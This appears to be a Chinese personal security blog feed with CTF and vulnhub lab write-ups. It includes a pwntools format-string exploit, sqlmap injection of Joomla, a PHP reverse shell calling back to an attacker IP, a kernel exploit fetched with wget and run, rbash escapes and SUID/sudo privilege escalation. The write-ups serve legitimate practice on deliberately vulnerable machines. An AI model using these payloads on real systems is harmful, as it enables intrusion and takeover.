    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h1><p>开局一个压缩包，010看看，只能说毫无收获</p><p>想到可能又是zip知识点全集，先暴破，发现密码是0573，和压缩包名字相同</p><p><img src="/2020/11/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF/1.jpg" alt="img"></p><p>接着试一试，发现里面的也是类似的</p><p>于是写个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">psw=<span class="string">&#x27;0573&#x27;</span></span><br><span class="line"></span><br><span class="line">file = zipfile.ZipFile(<span class="string">&#x27;./0573.zip&#x27;</span>,)</span><br><span class="line">ziplist = file.namelist()</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> ziplist:</span><br><span class="line">file.extract(f,<span class="string">r&#x27;./&#x27;</span>, pwd=psw.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">psw=f.replace(<span class="string">&#x27;.zip&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">file = zipfile.ZipFile(<span class="string">&#x27;./&#x27;</span>+ psw + <span class="string">&#x27;.zip&#x27;</span>,)</span><br><span class="line">ziplist = file.namelist()</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> ziplist:</span><br><span class="line">file.extract(f,<span class="string">r&#x27;./&#x27;</span>, pwd=psw.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">psw=(f.replace(<span class="string">&#x27;.zip&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>运行到报错即可。当然你用try except也行。</p><p>当然如果你从最外面开始直接解压也行。</p><p>然后按照大小排序，很容易找到一个qr.txt，显然是画二维码的。</p><p><img src="/2020/11/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF/2.jpg" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = y = <span class="number">200</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;./qr.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> height <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()[<span class="number">1</span>:-<span class="number">2</span>] <span class="comment">#.replace(&quot;(&quot;,&quot;&quot;).replace(&quot;)&quot;,&quot;&quot;)</span></span><br><span class="line">        rgb = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        img.putpixel((width,height),(<span class="built_in">int</span>(rgb[<span class="number">0</span>]),<span class="built_in">int</span>(rgb[<span class="number">1</span>]),<span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line">img.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到二维码</p><p><img src="/2020/11/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF/3.jpg" alt="img"></p><p><img src="/2020/11/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF/4.jpg" alt="img"></p><p>不禁让人想说，真的有3k次吗</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记_PWN5</title>
    <link href="https://blog.pillar.fun/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/"/>
    <id>https://blog.pillar.fun/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/</id>
    <published>2020-10-04T06:36:46.000Z</published>
    <updated>2023-02-24T03:28:44.085Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的pwn刷题日记</p><h1 id="第五空间2019-决赛-PWN5-1"><a href="#第五空间2019-决赛-PWN5-1" class="headerlink" title="[第五空间2019 决赛]PWN5 1"></a>[第五空间2019 决赛]PWN5 1</h1><p>检查一下</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/1.jpg" alt="img"></p><p>32位，开启canary和nx</p><p>利用strings可以找到/bin/sh</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/2.jpg" alt="img"></p><p>ida打开，看到system函数和printf</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/3.jpg" alt="img"></p><p>并且看到这里直接printf了我们输入的name</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/4.jpg" alt="img"></p><p>所以直接格式化字符串，将unk_804C044的值改了，然后输入相同的内容就可。</p><p>利用%08x找到格式化字符串和我们之间的距离为10</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/5.jpg" alt="img"></p><p>格式化字符串漏洞即 格式化的%n会往当前所指的地址的内容的地址写入已经打印出来的字符的长度。再利用X$（X为任意数值）来作为距离格式化字符串所在地址的偏移量，即可实现任意位置写。</p><p>然后我们在AAAA的地方写上0x804c044，在加上%10$n就可以将AAAA所在位置的内容地址写为len(0x804c044)+len(%10$n)=4</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25064</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x804c044</span>)+<span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line">sla(<span class="string">&#x27;name:&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">&#x27;passwd:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是没太搞懂这个要怎么在gdb里动态调试，希望有大手子教一下……</p><p>后面看别人wp，可以改写atoi的got地址为system，然后输入/user/bin</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="pwn" scheme="https://blog.pillar.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-DC-3</title>
    <link href="https://blog.pillar.fun/2020/08/18/vulnhub-DC-3/"/>
    <id>https://blog.pillar.fun/2020/08/18/vulnhub-DC-3/</id>
    <published>2020-08-18T08:44:01.000Z</published>
    <updated>2022-04-14T04:40:15.416Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a></p><p>一个flag，冲！</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>靶机和kali都NAT在vmware了</p><p>虽然但是，ova里设置有一内内问题，根据提示修改一下设置</p><p><img src="/2020/08/18/vulnhub-DC-3/1.jpg" alt="img"></p><p>然后在就可以愉快的开干了</p><p>arp-scan</p><p><img src="/2020/08/18/vulnhub-DC-3/2.jpg" alt="img"></p><p>靶机为192.168.77.142</p><p>nmap看看</p><p><img src="/2020/08/18/vulnhub-DC-3/3.jpg" alt="img"></p><p>可以看到是80的http，并且是一个开源的框架Joomla，打开看看</p><p><img src="/2020/08/18/vulnhub-DC-3/4.jpg" alt="img"></p><p>用joomscan扫一下</p><p><img src="/2020/08/18/vulnhub-DC-3/5.jpg" alt="img"></p><p>可以看到是3.7.0版本，后台是adminstrator，没有内核漏洞</p><p>直接进行一个searchsploit</p><p><img src="/2020/08/18/vulnhub-DC-3/6.jpg" alt="img"></p><p>查看sploit</p><p><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p><p><img src="/2020/08/18/vulnhub-DC-3/7.jpg" alt="img"></p><p>上sqlmap</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.77.142/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.77.142/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> -D <span class="string">&#x27;joomladb&#x27;</span> --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.77.142/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> -D <span class="string">&#x27;joomladb&#x27;</span> -T <span class="string">&#x27;#__users&#x27;</span> --columns</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.77.142/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> -D <span class="string">&#x27;joomladb&#x27;</span> -T <span class="string">&#x27;#__users&#x27;</span> -C <span class="string">&#x27;username,password&#x27;</span> --dump</span><br></pre></td></tr></table></figure><p><img src="/2020/08/18/vulnhub-DC-3/8.jpg" alt="img"></p><p>当问你是否用已有cookie是选默认y</p><p><img src="/2020/08/18/vulnhub-DC-3/9.jpg" alt="img"></p><p>当问你是否爆列名是选y而不要选默认的N</p><p><img src="/2020/08/18/vulnhub-DC-3/10.jpg" alt="img"></p><p><img src="/2020/08/18/vulnhub-DC-3/11.jpg" alt="img"></p><p><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p><p>用johntheripper爆一下</p><p><img src="/2020/08/18/vulnhub-DC-3/12.jpg" alt="img"></p><p>密码是史努比，登录后台</p><p><img src="/2020/08/18/vulnhub-DC-3/13.jpg" alt="img"></p><p>经过一番寻找，我们发现extensions-&gt;template-&gt;template里能编辑模板，其中能往里面写任意的php代码，可以使用php反弹一个shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当系统没有禁用proc_popen的时候，我们是可以借助proc_popen轻松反弹这样的一个shell的。</span></span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="string">&quot;192.168.77.140&quot;</span>, <span class="string">&quot;5555&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">1</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">2</span> =&gt; <span class="variable">$sock</span></span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/08/18/vulnhub-DC-3/14.jpg" alt="img"></p><p>在kali监听5555端口</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure><p>成功连接，用python起一个tty，并且查看自己的id</p><p><img src="/2020/08/18/vulnhub-DC-3/15.jpg" alt="img"></p><p>获取了webshell，但是无法进入root的目录，所以现在想办法获取root，查看系统版本</p><p><img src="/2020/08/18/vulnhub-DC-3/16.jpg" alt="img"></p><p>ubuntu16.04，内核版本是4.4.0-21-generic</p><p>searchsploit看看</p><p><img src="/2020/08/18/vulnhub-DC-3/17.jpg" alt="img"></p><p>看看39772.txt（一般txt写的比较详细）</p><p><img src="/2020/08/18/vulnhub-DC-3/18.jpg" alt="img"></p><p>下载他的exp</p><p><code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></p><p>然后在kali起个Apache，把exp放过去</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mv 39772.zip /var/www/html</span><br><span class="line">systemctl start apache2.service</span><br></pre></td></tr></table></figure><p>在webshell里wget</p><p><img src="/2020/08/18/vulnhub-DC-3/19.jpg" alt="img"></p><p>然后解压按照操作做就完事了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip 39772.zip</span><br><span class="line"><span class="built_in">cd</span> 39772.zip</span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line"><span class="built_in">cd</span> exploit</span><br><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p><img src="/2020/08/18/vulnhub-DC-3/20.jpg" alt="img"></p><p>有了root，进root，查看flag</p><p><img src="/2020/08/18/vulnhub-DC-3/21.jpg" alt="img"></p><p>参考</p><p><a href="https://blog.csdn.net/a310034188/article/details/122709729">https://blog.csdn.net/a310034188/article/details/122709729</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://blog.pillar.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-DC-2</title>
    <link href="https://blog.pillar.fun/2020/08/10/vulnhub-DC-2/"/>
    <id>https://blog.pillar.fun/2020/08/10/vulnhub-DC-2/</id>
    <published>2020-08-10T08:24:19.000Z</published>
    <updated>2022-04-11T08:48:12.045Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p><p>五个flag，冲！！</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>靶机和kali都NAT在vmware了</p><p>在kali直接进行一个arpscan</p><p><img src="/2020/08/10/vulnhub-DC-2/1.jpg" alt="img"></p><p>192.168.77.141即是靶机</p><p>用nmap收集信息</p><p><img src="/2020/08/10/vulnhub-DC-2/2.jpg" alt="img"></p><p>可以看见开启了80端口运行http服务，开启了7744端口运行ssh服务，且http服务有提示不要去重定向到dc-2。尝试访问一哈，发现并不能成功，这是因为重定向到dc-2的时候dns无法解析，因此设置hosts，让dc-2解析向192.168.77.141</p><p><img src="/2020/08/10/vulnhub-DC-2/3.jpg" alt="img"></p><p><img src="/2020/08/10/vulnhub-DC-2/4.jpg" alt="img"></p><p>即可成功访问</p><p><img src="/2020/08/10/vulnhub-DC-2/5.jpg" alt="img"></p><p>提示是一个WordPress网站。</p><p>且直接给了你flag1</p><p><img src="/2020/08/10/vulnhub-DC-2/6.jpg" alt="img"></p><p>意思是常见密码可能不对，要用cewl</p><p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p><p>听劝，使用cewl来生成密码字典</p><p><code>cewl http://dc-2 -w passwd.txt</code></p><p><img src="/2020/08/10/vulnhub-DC-2/7.jpg" alt="img"></p><p>然后用wpscan来生成用户名字典</p><p><code>wpscan --url http://dc-2/ -e -u</code></p><p><img src="/2020/08/10/vulnhub-DC-2/8.jpg" alt="img"></p><p>把admin、tom和jerry存到username.txt里</p><p>用wpscan暴破</p><p><code>wpscan --url http://dc-2/ -U username.txt -P passwd.txt</code></p><p><img src="/2020/08/10/vulnhub-DC-2/9.jpg" alt="img"></p><p>看到两组用户名密码</p><p>jerry, adipiscing</p><p>tom, parturient</p><p>wp经典后台wp-admin登录，在page里看到flag2</p><p><img src="/2020/08/10/vulnhub-DC-2/10.jpg" alt="img"></p><p>提示还有一种方法，用tom和jerry还有admin来连ssh</p><p>发现tom可以登录。</p><p><img src="/2020/08/10/vulnhub-DC-2/11.jpg" alt="img"></p><p>寻思看看权限，发现rbash里没有whoami和id的权限。</p><p><img src="/2020/08/10/vulnhub-DC-2/12.jpg" alt="img"></p><p>用compgen命令看看能用什么命令</p><p><code>compgen -c</code></p><p><img src="/2020/08/10/vulnhub-DC-2/13.jpg" alt="img"></p><p>看到还有ls和vi命令可以用</p><p><img src="/2020/08/10/vulnhub-DC-2/14.jpg" alt="img"></p><p>ls看到有flag3，vi打开，得到内容</p><p><img src="/2020/08/10/vulnhub-DC-2/15.jpg" alt="img"></p><p>提示我们去jerry，但是我们没有cd的权限，笑嘻了，这里的知识点是绕过rbash，</p><p>法1：vi绕过rbash：</p><p>在vi命令模式下输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>即可起一个由/bin/bash的终端</p><p>法2：</p><p><code>BASH_CMDS[a]=/bin/sh;a</code></p><p>相当于两步，第一步吧/bin/sh赋给BASH_CMDS[a]，然后a，就相当于执行了/bin/sh</p><p>BASH_CMDS是一个内部命令的哈希表可以参考<a href="https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html">这个文档</a>和<a href="https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html">这个文档</a>，我的理解是当我们输入.的时候，他就会根据这个key去找BASH_CMDS的内容，这个内容就是当前上下文，所以我们在bash里输入.就相当于在当前位置。而我们设置了a是/bin/sh，再执行a就相当于执行了/bin/sh</p><p>反正完事以后要export那些/bin，这样就能执行那些命令了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin</span><br></pre></td></tr></table></figure><p>然后我们跳到jerry的home，就可以看到flag4了</p><p><img src="/2020/08/10/vulnhub-DC-2/16.jpg" alt="img"></p><p>然后可以看到作者口嫌体正直的给了我们一个hint，用git提权</p><p>顺便看看刚才没看的自己的权限</p><p><img src="/2020/08/10/vulnhub-DC-2/17.jpg" alt="img"></p><p>接下来的知识点是git提权</p><p>git提权的要求是能sudo，然后我们发现tom不能sudo，换成jerry，发现jerry也不能，但是有一个提示</p><p><img src="/2020/08/10/vulnhub-DC-2/18.jpg" alt="img"></p><p>意思是jerry可以以root来运行git</p><p>git提权</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p><img src="/2020/08/10/vulnhub-DC-2/19.jpg" alt="img"></p><p>在root的文件夹下即可看到最后一个flag</p><p><img src="/2020/08/10/vulnhub-DC-2/20.jpg" alt="img"></p><p>芜湖，起飞~</p><p>参考：</p><p><a href="https://blog.csdn.net/a310034188/article/details/121624538">https://blog.csdn.net/a310034188/article/details/121624538</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://blog.pillar.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-DC-1</title>
    <link href="https://blog.pillar.fun/2020/08/01/vulnhub-DC-1/"/>
    <id>https://blog.pillar.fun/2020/08/01/vulnhub-DC-1/</id>
    <published>2020-08-01T08:33:28.000Z</published>
    <updated>2022-04-08T08:25:46.998Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.vulnhub.com/">vulnhub</a>入门靶机渗透。<br>靶机有5个flag，让我们冲<br>实验环境：<br>192.168.77.0/24：<br>    kali 192.168.77.128<br>    DC-1 unknown</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先arp-scan找局域网里存活的主机<br><img src="/2020/08/01/vulnhub-DC-1/1.jpg" alt><br>然后使用nmap查看他开的端口和服务<br><img src="/2020/08/01/vulnhub-DC-1/2.jpg" alt><br>可以看到开启了80的http和22的ssh，因此先去浏览器访问一下<br><img src="/2020/08/01/vulnhub-DC-1/3.jpg" alt><br>发现是Drupal7，查相关资料可以知道存在RCE漏洞。<br><a href="https://www.xctf.org.cn/library/details/58bd0f2c4d4c77aef7d15787cb65008a6533b87a/">https://www.xctf.org.cn/library/details/58bd0f2c4d4c77aef7d15787cb65008a6533b87a/</a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>直接用metasploit<br><img src="/2020/08/01/vulnhub-DC-1/4.jpg" alt><br>使用日期比较靠前的drupalgeddon2，成功起了一个meterpreter<br><img src="/2020/08/01/vulnhub-DC-1/5.jpg" alt><br>用shell命令获得shell，用id查看当前用户<br><img src="/2020/08/01/vulnhub-DC-1/6.jpg" alt><br>ls后发现一个flag1.txt，提示我们去查看config file<br><img src="/2020/08/01/vulnhub-DC-1/7.jpg" alt><br>于是查看drupal的配置文件settings/default/settings.php，发现flag2，提示我们字典暴破不是唯一的获取权限方法（这里也是提示我们可以直接暴破密码），并且提供数据库的账号密码<br><img src="/2020/08/01/vulnhub-DC-1/8.jpg" alt><br>于是我们尝试连数据库，先利用Python模拟tty</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/vulnhub-DC-1/9.jpg" alt></p><p>然后查看drupaldb，看表名<br><img src="/2020/08/01/vulnhub-DC-1/10.jpg" alt><br>看到有个user表，看看有哪些列。<br><img src="/2020/08/01/vulnhub-DC-1/11.jpg" alt><br>直接看一下name和pass<br><img src="/2020/08/01/vulnhub-DC-1/12.jpg" alt><br>发现密码是被加密过的，经过搜索，得知加密函数user_hash_password()在/includes/password.inc里<br><img src="/2020/08/01/vulnhub-DC-1/13.jpg" alt><br>可以看到，密码是加盐后的sha512，但是搜索引擎下面的条目是<br><a href="https://www.cnblogs.com/mafeifan/p/4909631.html">https://www.cnblogs.com/mafeifan/p/4909631.html</a><br>直接按他的方法<br><img src="/2020/08/01/vulnhub-DC-1/14.jpg" alt><br><img src="/2020/08/01/vulnhub-DC-1/15.jpg" alt><br>于是可以直接登录，查看到flag3<br><img src="/2020/08/01/vulnhub-DC-1/16.jpg" alt><br>flag3提示我们得要继续提权到执行命令为止，然而我们在metasploit的时候就已经可以执行命令了，于是想到看看用户表<br><img src="/2020/08/01/vulnhub-DC-1/17.jpg" alt><br>到他的目录下看看，发现flag4<br><img src="/2020/08/01/vulnhub-DC-1/18.jpg" alt><br>flag4提示我们root中有一个flag，于是我们搜索一下root<br><img src="/2020/08/01/vulnhub-DC-1/19.jpg" alt><br>直接访问之，发现访问被拒绝辣<br><img src="/2020/08/01/vulnhub-DC-1/20.jpg" alt><br>这里用find命令劫持提权，因为可以看到find有suid权限<br><img src="/2020/08/01/vulnhub-DC-1/21.jpg" alt><br>提权成功，以通过root提起一个shell<br><img src="/2020/08/01/vulnhub-DC-1/22.jpg" alt><br>查看final flag<br><img src="/2020/08/01/vulnhub-DC-1/23.jpg" alt></p><p>至此，过程就结束了。<br>flag5确实不会，知识盲区。看了答案_(:з」∠)_，但是有所长进，就是好的！</p><p>参考：<br><a href="https://www.cnblogs.com/chalan630/p/12639911.html">https://www.cnblogs.com/chalan630/p/12639911.html</a><br><a href="https://www.cnblogs.com/peida/archive/2012/11/14/2769248.html">https://www.cnblogs.com/peida/archive/2012/11/14/2769248.html</a><br><a href="https://www.cnblogs.com/linuxsec/articles/9193048.html">https://www.cnblogs.com/linuxsec/articles/9193048.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://blog.pillar.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>安卓内核pwn之缓冲区溢出</title>
    <link href="https://blog.pillar.fun/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <id>https://blog.pillar.fun/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</id>
    <published>2020-07-22T05:04:01.000Z</published>
    <updated>2021-03-08T05:14:06.447Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>AndroidKernelExploitationPlayground之kernel_exploit_challenges / challenge / stack_buffer_overflow / module / stack_buffer_overflow.c</p><a id="more"></a><p>代码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LENGTH 64</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Ryan Welton&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Stack Buffer Overflow Example&quot;</span>);</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">stack_buffer_proc_entry</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">proc_entry_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, <span class="keyword">unsigned</span> <span class="keyword">long</span> count, <span class="keyword">void</span> 